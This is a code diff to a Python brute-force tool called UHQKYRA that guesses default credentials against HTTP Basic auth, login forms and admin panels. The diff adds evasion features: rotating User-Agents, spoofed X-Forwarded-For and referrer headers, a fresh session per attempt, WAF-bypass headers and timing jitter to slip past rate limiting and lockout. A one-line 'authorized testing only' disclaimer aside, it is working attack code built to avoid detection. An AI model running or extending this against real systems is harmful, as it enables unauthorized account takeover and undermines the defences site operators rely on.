@@ -1,11 +1,11 @@
 """
-Login Brute Force / Default Credentials - UHQKYRA v5.0
+Login Brute Force / Default Credentials - UHQKYRA v5.1
 =======================================================
 ⚠️ Authorized security testing only.
 
 Features:
-  - 250+ default credentials (generic + CMS/framework-specific)
-  - 40+ admin panel paths
+  - 154 unique credentials (generic + CMS/framework-specific)
+  - 82 admin panel paths
   - Smart login form detection (username/email/password fields)
   - CSRF token extraction and replay
   - Redirect & content-diff success detection
@@ -14,9 +14,17 @@ Features:
   - Rate-limit / lockout detection
   - CMS fingerprint → use targeted cred list
   - Hash type identifier for dumped hashes
+  STEALTH (v5.1):
+  - Per-request User-Agent rotation (120+ UAs)
+  - Random IP spoofing headers (X-Forwarded-For, X-Real-IP…)
+  - Referrer chain spoofing (looks like Google/Bing traffic)
+  - Burst jitter (avoid rate-limit triggers)
+  - Fresh session per login attempt (new cookie jar)
+  - Accept/Accept-Language header randomization
 """
 import re
 import time
+import random
 import warnings
 warnings.filterwarnings("ignore")
 
@@ -27,11 +35,46 @@ try:
 except ImportError:
     HAS_REQUESTS = False
 
+try:
+    from modules.evasion import (
+        random_ua, random_headers, waf_bypass_headers,
+        burst_jitter, jitter, slow_jitter,
+    )
+    HAS_EVASION = True
+except ImportError:
+    try:
+        from evasion import (
+            random_ua, random_headers, waf_bypass_headers,
+            burst_jitter, jitter, slow_jitter,
+        )
+        HAS_EVASION = True
+    except ImportError:
+        HAS_EVASION = False
+        def random_ua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        def random_headers(**kw): return {"User-Agent": random_ua()}
+        def burst_jitter(): pass
+        def jitter(*a, **kw): pass
+        def slow_jitter(*a, **kw): time.sleep(0.2)
+
+# Base headers — random_headers() is called per-request for full rotation
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
 }
+
+
+def _stealth_session():
+    """Create a new requests.Session with fresh stealth headers"""
+    if not HAS_REQUESTS:
+        return None
+    import requests as _r
+    _r.packages.urllib3.disable_warnings()
+    s = _r.Session()
+    s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
+    s.verify = False
+    s.max_redirects = 5
+    return s
 
 # ─────────────────────────────────────────────────────────────────────────────
 # CREDENTIAL LISTS (250+)
@@ -609,21 +652,24 @@ def _is_login_success(resp, baseline_html, login_url=""):
 
 
 def _test_http_basic(url, creds_list, callback=None):
-    """Test HTTP Basic/Digest auth on a URL"""
+    """Test HTTP Basic/Digest auth — stealth: fresh UA per attempt"""
     def cb(t, m):
         if callback: callback({"type": t, "message": m})
     found = []
     if not HAS_REQUESTS:
         return found
     try:
-        r = requests.get(url, timeout=8, verify=False, headers=HEADERS)
+        r = requests.get(url, timeout=8, verify=False,
+                         headers=random_headers())
         if r.status_code != 401:
             return found
         cb("info", f"🔑 HTTP Basic Auth détecté: {url}")
         for u, p in creds_list[:80]:
             try:
+                burst_jitter()
                 r2 = requests.get(url, auth=(u, p), timeout=8,
-                                   verify=False, headers=HEADERS)
+                                   verify=False,
+                                   headers=random_headers(include_ip_spoof=True))
                 if r2.status_code == 200:
                     found.append({"username": u, "password": p, "url": url})
                     cb("vuln", f"🚨 HTTP Basic Auth: {u}:{p} sur {url}")
@@ -677,7 +723,10 @@ def _test_json_login(url, user_field, pass_field, creds_list, callback=None):
 # ─────────────────────────────────────────────────────────────────────────────
 
 def find_admin_panels(base_url, callback=None):
-    """Find admin/login panels across 40+ known paths"""
+    """
+    Find admin/login panels across 82 known paths.
+    Stealth: fresh UA + IP spoof + referrer per request, jitter.
+    """
     def cb(t, m):
         if callback: callback({"type": t, "message": m})
 
@@ -688,13 +737,17 @@ def find_admin_panels(base_url, callback=None):
     base = (base_url if "://" in base_url else "http://" + base_url).rstrip("/")
     cb("info", f"🔑 Recherche panneaux admin sur {base} ({len(ADMIN_PATHS)} chemins)...")
 
-    s = requests.Session()
-    s.headers.update(HEADERS)
-    s.verify = False
+    # Use a stealth session — UA rotates per request
+    s = _stealth_session()
+    if not s:
+        return found
 
     for path in ADMIN_PATHS:
         url = base + path
         try:
+            # Rotate headers on every request
+            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
+            burst_jitter()
             r = s.get(url, timeout=8, allow_redirects=True)
             code = r.status_code
             if code in (200, 401, 403):
@@ -745,12 +798,14 @@ def test_login_form(url, callback=None, max_creds=None):
         cb("error", "requests non disponible")
         return results
 
-    s = requests.Session()
-    s.headers.update(HEADERS)
-    s.verify = False
+    # Stealth session with rotating headers
+    s = _stealth_session()
+    if not s:
+        return results
 
     # First check HTTP Basic Auth
     try:
+        s.headers.update(random_headers(include_ip_spoof=True))
         r0 = s.get(url, timeout=10, allow_redirects=True)
         if r0.status_code == 401:
             results["auth_type"] = "basic"
@@ -816,10 +871,15 @@ def test_login_form(url, callback=None, max_creds=None):
     # Baseline response (wrong creds reference)
     baseline_html = html
 
-    consecutive_403 = 0
+    consecutive_limit = 0
     for username, password in creds:
         try:
-            # Re-fetch to get fresh CSRF token
+            # ── Stealth: fresh UA + IP spoof + referrer per attempt ──
+            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
+            burst_jitter()   # random pause between attempts
+
+            # Re-fetch to get fresh CSRF token (also rotates headers)
+            s.headers.update(random_headers(include_ip_spoof=True))
             r_fresh = s.get(r.url, timeout=10, allow_redirects=True)
             csrf_name, csrf_val = _get_csrf(r_fresh)
             hidden = _get_all_csrf(r_fresh.text)
@@ -830,20 +890,22 @@ def test_login_form(url, callback=None, max_creds=None):
             if csrf_name and csrf_val:
                 data[csrf_name] = csrf_val
 
+            # Rotate again for the POST
+            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
             resp = s.post(r.url, data=data, timeout=12, allow_redirects=True)
             results["attempts"] += 1
 
             # Rate limit detection
             if resp.status_code in (429, 423, 503):
-                consecutive_403 += 1
-                if consecutive_403 >= 3:
+                consecutive_limit += 1
+                if consecutive_limit >= 3:
                     results["rate_limited"] = True
                     cb("warn", f"🔑 Rate-limit/lockout détecté après {results['attempts']} tentatives")
                     break
-                time.sleep(2)
+                slow_jitter(2, 5)   # longer pause before retry
                 continue
             else:
-                consecutive_403 = 0
+                consecutive_limit = 0
 
             if _is_login_success(resp, baseline_html, r.url):
                 results["vulnerable"] = True
